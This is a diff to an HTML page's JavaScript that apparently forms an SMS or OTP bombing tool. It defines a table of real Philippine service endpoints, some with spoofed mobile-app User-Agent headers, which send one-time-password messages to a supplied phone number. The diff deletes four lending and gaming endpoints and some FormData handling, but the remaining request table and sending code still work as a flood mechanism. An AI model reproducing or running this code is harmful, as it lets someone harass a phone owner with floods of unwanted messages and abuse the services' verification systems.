@@ -169,7 +169,7 @@
     </div>
 
     <script>
-        // Enhanced API endpoints with better headers and payloads - ALL SERVICES INCLUDED
+        // Enhanced API endpoints with better headers and payloads
         const API_ENDPOINTS = {
             "XPRESS": {
                 url: "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
@@ -276,57 +276,6 @@
                 getBody: (phone) => JSON.stringify({
                     phone: phone
                 })
-            },
-            "EZLOAN": {
-                url: "https://gateway.ezloancash.ph/security/auth/otp/request",
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'okhttp/4.9.2'
-                },
-                getBody: (phone) => JSON.stringify({
-                    businessId: "EZLOAN",
-                    contactNumber: phone,
-                    appsflyerIdentifier: "1760444943092"
-                })
-            },
-            "EXCELLENT_LENDING": {
-                url: "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'okhttp/4.12.0'
-                },
-                getBody: (phone) => JSON.stringify({
-                    domain: phone,
-                    cat: "login",
-                    previous: false,
-                    financial: "efe35521e51f924efcad5d61d61072a9"
-                })
-            },
-            "WEMOVE": {
-                url: "https://api.wemove.com.ph/auth/users",
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'okhttp/4.9.3'
-                },
-                getBody: (phone) => JSON.stringify({
-                    phone_country: "+63",
-                    phone_no: phone.replace('+63', '')
-                })
-            },
-            "S5_OTP": {
-                url: "https://api.s5.com/player/api/v1/otp/request",
-                method: "POST",
-                headers: {
-                    'Content-Type': 'multipart/form-data'
-                },
-                getBody: (phone) => {
-                    const formData = new FormData();
-                    formData.append('phone_number', phone.replace('+', ''));
-                    return formData;
-                }
             }
         };
 
@@ -398,12 +347,6 @@
                     mode: 'cors',
                     credentials: 'omit'
                 };
-
-                // Special handling for FormData
-                if (options.body instanceof FormData) {
-                    // Remove Content-Type header for FormData to let browser set it
-                    delete options.headers['Content-Type'];
-                }
 
                 // Add timeout
                 const timeoutPromise = new Promise((_, reject) => 
